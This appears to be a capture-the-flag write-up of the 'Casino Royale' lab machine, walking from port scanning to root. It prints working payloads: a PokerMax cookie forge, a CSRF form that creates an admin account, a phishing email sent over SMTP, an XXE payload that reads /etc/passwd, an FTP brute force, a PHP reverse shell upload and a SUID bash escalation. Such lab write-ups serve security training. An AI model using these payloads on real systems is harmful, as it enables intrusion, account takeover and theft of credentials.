---
{"dg-publish":true,"permalink":"/machines/casino-writeup/","noteIcon":""}
---



**Reconnaissance**

Port enumeration:
```bash
┌──(root㉿kali)-[/home/kali]
└─# nmap -sC -sS -Pn -n --min-rate=5000 -T5 192.168.0.107 -oG ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-15 03:48 EST
Nmap scan report for 192.168.0.107
Host is up (0.00031s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
25/tcp   open  smtp
|_smtp-commands: Couldn't establish connection on port 25
80/tcp   open  http
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 2 disallowed entries 
|_/cards /kboard
8081/tcp open  blackice-icecap
MAC Address: 00:0C:29:79:2D:61 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 64.32 seconds
```

Lets start with port 80

```bash

┌──(root㉿kali)-[/home/kali]
└─# whatweb 192.168.0.107
http://192.168.0.107 [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[192.168.0.107], Script

```
Apache

![Pasted image 20240115025418.png|450](/img/user/imgs/Pasted%20image%2020240115025418.png)
***Cheers!!***

Let's try some fuzzing with gobuster.

```bash

┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://192.168.0.107 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.107
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/includes             (Status: 301) [Size: 317] [--> http://192.168.0.107/includes/]
/install              (Status: 301) [Size: 316] [--> http://192.168.0.107/install/]
/javascript           (Status: 301) [Size: 319] [--> http://192.168.0.107/javascript/]
/cards                (Status: 301) [Size: 314] [--> http://192.168.0.107/cards/]
/phpmyadmin           (Status: 301) [Size: 319] [--> http://192.168.0.107/phpmyadmin/]
/server-status        (Status: 403) [Size: 301]
Progress: 220560 / 220561 (100.00%)
```

![Pasted image 20240115030031.png|800](/img/user/imgs/Pasted%20image%2020240115030031.png)

PokerMax Installation, interesting

Let's search some exploits for it 

```bash

┌──(root㉿kali)-[/home/kali]
└─# searchsploit PokerMax
---------------------------------------------------- ---------------------------------
 Exploit Title                                      |  Path
---------------------------------------------------- ---------------------------------
PokerMax Poker League 0.13 - Insecure Cookie Handli | php/webapps/6766.txt
---------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```js
//Exploit

javascript:document.cookie = "ValidUserAdmin=admin";


```
Exploit dev states:

>"Go to http://site.com/pokerleague/pokeradmin/configure.php It will ask for login. Now in url tab run the exploit command, then return back to http://site.com/pokerleague/pokeradmin/configure.php"
>

]]![Pasted image 20240115031135.png|850](/img/user/imgs/Pasted%20image%2020240115031135.png)

Pwned

![Pasted image 20240115031207.png](/img/user/imgs/Pasted%20image%2020240115031207.png)
Checking at the player info found valenka

![Pasted image 20240115031236.png](/img/user/imgs/Pasted%20image%2020240115031236.png)


"Player Profile"
```
Project Manager of various client projects on: /vip-client-portfolios/?uri=blog

We are casino-royale.local -- Update your hosts file!
```

After updating /etc/hosts file: 

Link ended looking like this

http://casino-royale.local/vip-client-portfolios/?uri=blog

![Pasted image 20240115031514.png](/img/user/imgs/Pasted%20image%2020240115031514.png)

SnowFox CMS 

![Pasted image 20240115031537.png](/img/user/imgs/Pasted%20image%2020240115031537.png)

Seems the machine will check any email if the subject has a player name,

```bash
┌──(root㉿kali)-[~kali/exploitcasino]
└─# searchsploit Snowfox                
---------------------------------------------------- ---------------------------------
 Exploit Title                                      |  Path
---------------------------------------------------- ---------------------------------
Snowfox CMS 1.0 - Cross-Site Request Forgery (Add A | php/webapps/35301.html
---------------------------------------------------- -----------------------------

```
Vulnerable to a CSRF attack if someone with admin rights clicks my link, 

This exploit will create the user you give.

-->

```html
<html>
  <body>
    <form action="http://casino-royale.local/vip-client-portfolios/?uri=admin/accounts/create" method="POST">
      <input type="hidden" name="emailAddress" value="blackhexsage@darkthrone.mk" />
      <input type="hidden" name="verifiedEmail" value="verified" />
      <input type="hidden" name="username" value="blackhexsage" />
      <input type="hidden" name="newPassword" value="mypassword123" />
      <input type="hidden" name="confirmPassword" value="mypassword123" />
      <input type="hidden" name="userGroups[]" value="34" />
      <input type="hidden" name="userGroups[]" value="33" />
      <input type="hidden" name="memo" value="CSRFmemo" />
      <input type="hidden" name="status" value="1" />
      <input type="hidden" name="formAction" value="submit" />
      <input type="submit" value="Submit form" />
    </form>
  </body>
</html>
```

>BlackHexSage 
>HexReaper

```bash

                                                                                      
┌──(root㉿kali)-[~kali/exploitcasino]
└─# php -S 0.0.0.0:80
[Mon Jan 15 04:24:27 2024] PHP 8.2.10 Development Server (http://0.0.0.0:80) started

```

Lets send our exploit.

Found user obanno on player names, 

```bash

──(root㉿kali)-[/home/kali]
└─# telnet 192.168.0.107 25
Trying 192.168.0.107...
Connected to 192.168.0.107.
Escape character is '^]'.
MAIL FROM: hacker@hacker.com
220 Mail Server - NO UNAUTHORIZED ACCESS ALLOWED Pls.
250 2.1.0 Ok
RCPT TO: valenka
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
subject: obanno
look at this:        
http://192.168.0.112/snowfoxexploit.html            

.
250 2.0.0 Ok: queued as A42D01D05

```

Lets wait if we get a GET LOL


```bash

┌──(root㉿kali)-[~kali/exploitcasino]
└─# php -S 0.0.0.0:80
[Mon Jan 15 04:24:27 2024] PHP 8.2.10 Development Server (http://0.0.0.0:80) started
[Mon Jan 15 04:30:37 2024] 192.168.0.107:53562 Accepted
[Mon Jan 15 04:30:37 2024] 192.168.0.107:53562 [200]: GET /snowfoxexploit.html
[Mon Jan 15 04:30:37 2024] 192.168.0.107:53562 Closing
```

Got a get, lets test the user made. 

blackhexsage@darkthrone.mk
mypassword123

![Pasted image 20240115034222.png](/img/user/imgs/Pasted%20image%2020240115034222.png)

We are now admin

Checking le@casino-royale.local  user description

![Pasted image 20240115035002.png](/img/user/imgs/Pasted%20image%2020240115035002.png)


![Pasted image 20240115035030.png](/img/user/imgs/Pasted%20image%2020240115035030.png)

Seems it receives POST request using an xml DTD format.

Let's try XEE

```xml

<?xml version="1.0" encoding="ISO-8859-1"?>

  <!DOCTYPE foo [  

  <!ELEMENT foo ANY >

  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>

<creds>

    <customer>&xxe;</customer>

    <password>password</password>

</creds>

\
```
Further doc 
https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection
 
```bash

┌──(kali㉿kali)-[~]
└─$ curl -d "@xxe.txt" -X POST http://casino-royale.local/ultra-access-view/main.php | grep ftp

ftp:x:115:124:ftp daemon,,,:/srv/ftp:/bin/false
ftpUserULTRA:x:1002:1002::/var/www/html/ultra-access-view:/bin/bash
<!--also pls update the password for the custom ftp acct once the front end is finished..since it's easy -->

```
Found the ftpUserULTRA

Based on previous hint:
<!--also pls update the password for the custom ftp acct once the front end is finished..since it's easy -->

Seems it can be bruteforced, 

Lets try an ftp bruteforced to do so, or hydra,

I like this one because is more verbose,

Found the pass **bankbank**

```bash
┌──(root㉿kali)-[~kali/FTP-Bruteforcer]
└─# python3 multithread-ssh-and-Ftp-Bruteforcer.py 192.168.0.107 -p 21 -u ftpUserULTRA -w /usr/share/wordlists/fasttrack.txt -ftp

---------------------------------------------------------
---------------------------------------------------------
[*] Target      : 192.168.0.107
[*] Port        : 21
[*] Threads     : 4
[*] Wordlist    : /usr/share/wordlists/fasttrack.txt
[*] Protocol    : ftp
---------------------------------------------------------
---------------------------------------------------------
Ftp Bruteforce starting at 15/01/2024 05:42:13
---------------------------------------------------------
---------------------------------------------------------
[Attempt] target 192.168.0.107 - login:ftpUserULTRA - password:Spring2015
[Attempt] target 192.168.0.107 - login:ftpUserULTRA - password:Spring2016
[Attempt] target 192.168.0.107 - login:ftpUserULTRA - password:Spring2017
[Attempt] target 192.168.0.107 - login:ftpUserULTRA - password:Spring2014
[Attempt] target 192.168.0.107 - login:ftpUserULTRA - password:Spring2013
Attempt] target 192.168.0.107 - login:ftpUserULTRA - password:testtest
[Attempt] target 192.168.0.107 - login:ftpUserULTRA - password:testing123
[21] [ftp] host:192.168.0.107  login:ftpUserULTRA  password:bankbank

```

>[21] [ftp] host:192.168.0.107  login: **ftpUserULTRA**  password **bankbank**


Using MobaXterm I setup the user

![Pasted image 20240115044510.png](/img/user/imgs/Pasted%20image%2020240115044510.png)

![Pasted image 20240115044630.png](/img/user/imgs/Pasted%20image%2020240115044630.png)



![Pasted image 20240115044646.png](/img/user/imgs/Pasted%20image%2020240115044646.png)


Based on page link we are seeing the ftp files.

![Pasted image 20240115044709.png](/img/user/imgs/Pasted%20image%2020240115044709.png)

Lets try to upload a php reverse shell first with no extension and then we rename it to php3 format.

![Pasted image 20240115044829.png](/img/user/imgs/Pasted%20image%2020240115044829.png)


```bash


┌──(root㉿kali)-[~kali/exploitcasino]
└─# ftp ftp://ftpUserULTRA:bankbank@192.168.0.107   
Connected to 192.168.0.107.
220 Customer Access Level: ULTRA
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.

ftp> ls

229 Entering Extended Passive Mode (|||58114|)
150 Here comes the directory listing.

drwxr-xr-x    2 1002     1002         4096 Feb 22  2019 Desktop
-rw-------    1 1002     1002         5679 Jan 15 05:48 php_reverse_shell.php3
drwxrwxrwx    2 1002     1002         4096 Jan 13 23:01 test
226 Directory send OK.

ftp> chmod 777 php_reverse_shell.php3
200 SITE CHMOD command ok.
ftp> 

```

![Pasted image 20240115045338.png](/img/user/imgs/Pasted%20image%2020240115045338.png)

![Pasted image 20240115045549.png](/img/user/imgs/Pasted%20image%2020240115045549.png)


/var/www/html/ultra-access-view/.config
/var/www/html/ultra-access-view/.config


```bash
find /var/www/html \*config* 2>/dev/null -exec cat {} \; | grep -i 11A -B 4

self::$cfg['dbDebugMode'] = false;
self::$cfg['dbServer'] = 'localhost';
self::$cfg['dbUser'] = 'valenka';
self::$cfg['dbPass'] = '11archives11!';
```

```bash

www-data@casino:/var/www/html/ultra-access-view$ su valenka
Password: 
valenka@casino:/var/www/html/ultra-access-view$ 

```

Got user access.

```bash

valenka@casino:~/Maildir$ find  / -perm -4000  2>/dev/null
/opt/casino-royale/mi6_detect_test
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap


valenka@casino://$ cd /tmp

valenka@casino:/tmp$ cat run.sh 

chmod +s /bin/bash

valenka@casino:/tmp$ /opt/casino-royale/mi6_detect_test

valenka@casino:/tmp$ bash -p

bash-4.4# whoami

root

```